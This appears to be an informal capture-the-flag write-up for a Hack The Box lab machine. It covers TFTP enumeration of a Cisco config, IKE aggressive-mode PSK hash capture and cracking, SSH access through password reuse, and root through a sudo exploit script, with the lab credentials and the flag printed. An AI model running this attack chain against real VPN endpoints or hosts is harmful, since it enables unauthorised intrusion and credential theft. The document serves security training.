
1) we will scan with nmap :

nmap -sV -sC 10.129.5.50                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-12 19:38 CET
Nmap scan report for cctv.htb (10.129.5.50)
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds



nmap scan :nmap -sV -sC 10.129.4.129  -sU 

Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE   VERSION
68/udp   open|filtered dhcpc
69/udp   open          tftp      Netkit tftpd or atftpd
500/udp  open          isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
| fingerprint-strings: 
|   IKE_MAIN_MODE: 
|_    "3DUfw
4500/udp open|filtered nat-t-ike


2)  TFTP doesn't provide directory listing so the script tftp-enum from nmap will try to brute-force default paths.

nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.129.4.129 
we find  ciscortr.cfg it cisco router config file 

4) we read th file and collect the information can help us to connect to the router via the  vpn (isakmp)



###################
!

crypto / client configuration group rtr-remote

	key secret-password

	dns 208.67.222.222

	domain expressway.htb

	pool dynpool

!
crypto ipsec client ezvpn ezvpnclient

	connect auto

	group 2 key secret-password

	mode client

	peer 192.168.100.1

!

######################

+ we find the GORUP NAME (ID): rtr-remote


3) we will find valid transformation 

ike-scan -M 10.129.5.50  
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.5.50	Main Mode Handshake returned
	HDR=(CKY-R=8afe25d7b6763262)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.220 seconds (4.55 hosts/sec).  1 returned handshake; 0 returned notify


4) If aggressive mode is supported and you know the id, you can get the hash of the passwor

ike-scan -A -M -n rtr-remote 10.129.5.50 --pskcrack=hash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.5.50	Aggressive Mode Handshake returned
	HDR=(CKY-R=8bb08e9af3dd5f84)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

5) we will crack the P hash we get it 
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt                                                        
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash e4e062ce90098a0133af60eefbd9558367e2d118
Ending psk-crack: 8045040 iterations in 40.375 seconds (199256.62 iterations/sec)

we get the Pre-share key : freakingrockstarontheroad

5) we will use password reuse and login with the that creds ike:freakingrockstarontheroad
ssh ike@10.129.5.50 # password : freakingrockstarontheroad


6) priv esc :

Sudo version 1.9.17 
searchsploit Sudo 1.9.17  ==> find  a poc 

 ./sudo-chwoot.sh
[*] Running exploit…
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)

927a50cc1095dab8696ffd41d2e42b76

